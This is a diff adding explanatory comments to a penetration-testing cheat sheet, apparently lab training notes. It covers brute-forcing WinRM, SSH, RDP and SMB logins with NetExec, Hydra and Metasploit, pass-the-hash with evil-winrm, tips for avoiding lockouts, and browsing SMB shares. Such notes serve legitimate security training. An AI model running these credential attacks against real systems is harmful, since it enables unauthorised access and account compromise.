@@ -36,6 +36,7 @@ netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
 # Brute force WinRM
 netexec winrm 10.129.42.197 -u user.list -p password.list
 ```
+> NetExec supports multiple protocols with the same syntax. Pass a single username/password string or a file path. `(Pwn3d!)` in the output means the account can execute commands. Swap `winrm` for `smb`, `ssh`, `ldap`, etc.
 
 **Key indicator:** `(Pwn3d!)` in output means you can likely execute system commands.
 
@@ -48,6 +49,7 @@ sudo gem install evil-winrm
 # Connect
 evil-winrm -i <target-IP> -u <username> -p <password>
 ```
+> Opens an interactive PowerShell session via Windows Remote Management. Replace `-p` with `-H NTLM_HASH` for pass-the-hash. Requires WinRM to be enabled on the target (port 5985 or 5986).
 
 - Initializes a terminal session using **PowerShell Remoting Protocol (MS-PSRP)**
 
@@ -69,6 +71,7 @@ evil-winrm -i <target-IP> -u <username> -p <password>
 ```bash
 hydra -L user.list -P password.list ssh://10.129.42.197
 ```
+> `-L` takes a username list file, `-P` takes a password list file. Hydra tries every combination. Add `-t 4` to limit parallel tasks and avoid getting locked out or rate-limited by the SSH server.
 
 > **Note:** SSH servers often limit parallel connections. Use `-t 4` to reduce parallel tasks.
 
@@ -77,6 +80,7 @@ hydra -L user.list -P password.list ssh://10.129.42.197
 ```bash
 ssh user@10.129.42.197
 ```
+> Connects to the target over Secure Shell (SSH). Replace `user` with the found username. Add `-i keyfile` to use a private key instead of a password.
 
 ---
 
@@ -92,6 +96,7 @@ ssh user@10.129.42.197
 ```bash
 hydra -L user.list -P password.list rdp://10.129.42.197
 ```
+> Brute-forces Remote Desktop Protocol (RDP) on port 3389. Use `-t 1` to avoid connection failures from RDP's rate limiting. Successful credentials can then be used with `xfreerdp`.
 
 > **Warning:** RDP doesn't like many parallel connections. Use `-t 1` or `-t 4` and `-W 1` or `-W 3` for delays.
 
@@ -102,6 +107,7 @@ hydra -L user.list -P password.list rdp://10.129.42.197
 ```bash
 xfreerdp /v:<target-IP> /u:<username> /p:<password>
 ```
+> Connects to a Windows Remote Desktop. Add `/cert:ignore` for self-signed certificates, `/dynamic-resolution` to resize the window, and `+clipboard` to enable clipboard sharing.
 
 ---
 
@@ -117,6 +123,7 @@ xfreerdp /v:<target-IP> /u:<username> /p:<password>
 ```bash
 hydra -L user.list -P password.list smb://10.129.42.197
 ```
+> Brute-forces Server Message Block (SMB) on port 445. Older Hydra versions fail against SMBv3 — if you see `invalid reply from target`, switch to Metasploit's `smb_login` module or NetExec.
 
 > **Known issue:** Older Hydra versions can't handle SMBv3 replies → `[ERROR] invalid reply from target`. Fix: update/recompile Hydra or use Metasploit.
 
@@ -130,18 +137,21 @@ set pass_file password.list
 set rhosts 10.129.42.197
 run
 ```
+> Metasploit's SMB login scanner handles SMBv3 correctly and tries all user/password combinations. `-q` starts msfconsole without the banner. Use this when Hydra fails on modern Windows targets.
 
 ### NetExec — Enumerate Shares
 
 ```bash
 netexec smb 10.129.42.197 -u "user" -p "password" --shares
 ```
+> Lists accessible SMB shares after confirming valid credentials. Shows share names, types, and access level. Follow up with `smbclient` to browse specific shares.
 
 ### Smbclient — Access Shares
 
 ```bash
 smbclient -U user \\\\10.129.42.197\\SHARENAME
 ```
+> Connects to a specific SMB share. The double-backslash escaping is needed in bash. Once connected, use `ls`, `get`, `put`, and `cd` to navigate and transfer files.
 
 ---
 
